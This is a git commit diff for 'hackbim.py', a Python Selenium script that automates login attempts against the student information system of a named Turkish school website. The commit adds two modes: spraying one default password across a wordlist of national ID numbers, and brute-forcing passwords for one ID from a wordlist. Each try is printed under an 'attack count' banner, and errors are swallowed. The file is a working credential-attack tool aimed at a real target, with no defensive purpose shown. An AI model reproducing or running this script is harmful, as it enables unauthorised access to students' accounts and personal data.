806d1f7c80a81cd9b625da85b9d543baa065783c
rootebby <55960000+rootebby@users.noreply.github.com>
2020-10-03 00:50:35 +0300

    Update hackbim.py

--- hackbim.py
+++ hackbim.py
@@ -1,13 +1,7 @@
 from selenium import webdriver
 import time
 
-username = input("TC : ")
-wordlist = input("Wordlist Path : ")
-
-
-
 browser = webdriver.Firefox()
-
 url = "http://obs.finalokullari.com.tr/"
 
 browser.get(url)
@@ -17,37 +11,88 @@ usr_username = browser.find_element_by_xpath('//*[@id="username"]')
 usr_password = browser.find_element_by_xpath('//*[@id="password"]')
 usr_giris    = browser.find_element_by_xpath('/html/body/div[2]/div[1]/section/div/div/div[2]/div/div[2]/div/div[1]/div[2]/form/div[4]/button')
 
-say = 1
-with open(wordlist,"r",encoding="UTF-8") as wlist:
-	while True:
-		for word in wlist :
-			try:
-				usr_username.clear()
-				usr_password.clear()
 
-				usr_username.send_keys(username)
-				usr_password.send_keys(word)
-				
-				
-				usr_giris.click()
-				print("""
+
+
+
+say = 1
+print(""""
+1. TC     Bruter
+2. Passwd Bruter
+""")
+
+x = int(input("Seçenek : "))
+
+if x == 1:
+    passwd = input("Password = 'Default (123456) ' : ")
+    wordlist = input("Wordlist Path : ")
+    with open(wordlist,"r",encoding="UTF-8") as wlist:
+        while True:
+
+            for tc in wlist :
+                try:
+                    usr_username.clear()
+                    usr_password.clear()
+
+                    usr_username.send_keys(tc)
+                    usr_password.send_keys(passwd)
+                    
+                    
+                    usr_giris.click()
+                    print("""
 *************************
- coded by root@ebby:~# 
+coded by root@ebby:~# 
 *************************
- Atak Sayısı     ==>> {}   
+Atak Sayısı     ==>> {}   
 *************************
- Denenilen Şifre ==>> {}   
+Denenilen TC ==>> {}   
 *************************  
-				""".format(say,word))				
-				say += 1
-				
-				time.sleep(0.1)
-			except:
-				
-				pass
-				#print("Easyy !!")
-				#with open("script.txt","w",encoding="UTF-8") as script:
-					#script.write(str("TC : ") + str(username) + str("\n") +  str("Şifre : ") + str(word))
-		
+                    """.format(say,tc))				
+                    say += 1
+                    
+                    time.sleep(0.1)
+                except:
+                    
+                    pass
+                    #print("Easyy !!")
+                    #with open("script.txt","w",encoding="UTF-8") as script:
+                        #script.write(str("TC : ") + str(username) + str("\n") +  str("Şifre : ") + str(word))
+            
 			
+elif x == 2:
+    username = input("TC : ")
+    wordlist = input("Wordlist Path : ")
+    with open(wordlist,"r",encoding="UTF-8") as wlist:
+        while True:
+            for word in wlist :
+                try:
+                    usr_username.clear()
+                    usr_password.clear()
+
+                    usr_username.send_keys(username)
+                    usr_password.send_keys(word)
+                    
+                    
+                    usr_giris.click()
+                    print("""
+*************************
+coded by root@ebby:~# 
+*************************
+Atak Sayısı     ==>> {}   
+*************************
+Denenilen Şifre ==>> {}   
+*************************  
+                    """.format(say,word))				
+                    say += 1
+                    
+                    time.sleep(0.1)
+                except:
+                    
+                    pass
+                    #print("Easyy !!")
+                    #with open("script.txt","w",encoding="UTF-8") as script:
+                        #script.write(str("TC : ") + str(username) + str("\n") +  str("Şifre : ") + str(word))
+        
+else:
+    pass
 
